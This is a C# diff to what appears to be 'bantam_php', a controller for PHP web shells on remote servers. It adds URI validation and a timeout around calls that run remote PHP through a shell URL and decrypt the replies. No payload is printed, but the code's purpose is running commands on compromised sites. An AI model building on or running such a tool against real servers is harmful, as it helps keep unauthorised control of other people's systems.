@@ -71,6 +71,18 @@ namespace bantam_php
         /// <summary>
         /// 
         /// </summary>
+        /// <param name="uri"></param>
+        /// <returns></returns>
+        public bool IsValidUri(string uri)
+        {
+            Uri tempUri;
+            bool uriResult = Uri.TryCreate(uri, UriKind.Absolute, out tempUri);
+            return uriResult && (tempUri.Scheme == Uri.UriSchemeHttp || tempUri.Scheme == Uri.UriSchemeHttps);
+        }
+
+        /// <summary>
+        /// 
+        /// </summary>
         /// <param name="shellUrl"></param>
         /// <param name="pingMS"></param>
         public void addClientMethod(string shellUrl, string pingMS)
@@ -127,34 +139,47 @@ namespace bantam_php
         public async void getInitDataThread(string shellUrl)
         {
             if (string.IsNullOrEmpty(shellUrl) == false) {
+            
 
                 string[] data = { null };     
                 bool encryptResponse = Shells[shellUrl].encryptResponse;
 
                 Stopwatch pingWatch = new Stopwatch();
                 pingWatch.Start();
-                
-                string result = await WebHelper.ExecuteRemotePHP(shellUrl, PhpHelper.InitShellData(encryptResponse));
 
-                if (string.IsNullOrEmpty(result) == false) {
-                    if (encryptResponse) {
-                        result = EncryptionHelper.DecryptShellResponse(result);
-                    }
+                if (!IsValidUri(shellUrl)) {
+                    addClientMethod(shellUrl, "-");
+                    return;
+                }
 
-                    data = result.Split(new string[] { PhpHelper.colSeperator }, StringSplitOptions.None);
+                var task = WebHelper.ExecuteRemotePHP(shellUrl, PhpHelper.InitShellData(encryptResponse));
+                //todo add to global config delay
+                if (await Task.WhenAny(task, Task.Delay(10000)) == task) {
 
-                    var initDataReturnedVarCount = Enum.GetValues(typeof(PhpHelper.INIT_DATA_VARS)).Cast<PhpHelper.INIT_DATA_VARS>().Max();
+                    string result = task.Result;
 
-                    if (data != null && data.Length == (int)initDataReturnedVarCount + 1) {
-                        addClientMethod(shellUrl, pingWatch.ElapsedMilliseconds.ToString());
-                        Shells[shellUrl].update(pingWatch.ElapsedMilliseconds, data);
+                    if (string.IsNullOrEmpty(result) == false) {
+                        if (encryptResponse) {
+                            result = EncryptionHelper.DecryptShellResponse(result);
+                        }
+
+                        data = result.Split(new string[] { PhpHelper.colSeperator }, StringSplitOptions.None);
+
+                        var initDataReturnedVarCount = Enum.GetValues(typeof(PhpHelper.INIT_DATA_VARS)).Cast<PhpHelper.INIT_DATA_VARS>().Max();
+
+                        if (data != null && data.Length == (int)initDataReturnedVarCount + 1) {
+                            addClientMethod(shellUrl, pingWatch.ElapsedMilliseconds.ToString());
+                            Shells[shellUrl].update(pingWatch.ElapsedMilliseconds, data);
+                        } else {
+                            addClientMethod(shellUrl, "-");
+                        }
                     } else {
                         addClientMethod(shellUrl, "-");
                     }
+                    pingWatch.Stop();
                 } else {
                     addClientMethod(shellUrl, "-");
                 }
-                pingWatch.Stop();
             }
         }
 
@@ -223,12 +248,12 @@ namespace bantam_php
                 Shells[shellUrl].pingStopwatch = new Stopwatch();
                 Shells[shellUrl].pingStopwatch.Start();
 
+                //todo test this when shell has gone away
                 //todo encryption
                 string result = await WebHelper.ExecuteRemotePHP(shellUrl, PhpHelper.phpTestExecutionWithEcho);
 
                 lvi.SubItems[1].Text = Shells[shellUrl].pingStopwatch.ElapsedMilliseconds.ToString() + " ms";
                 Shells[shellUrl].pingStopwatch.Stop();
-
             }
         }
 
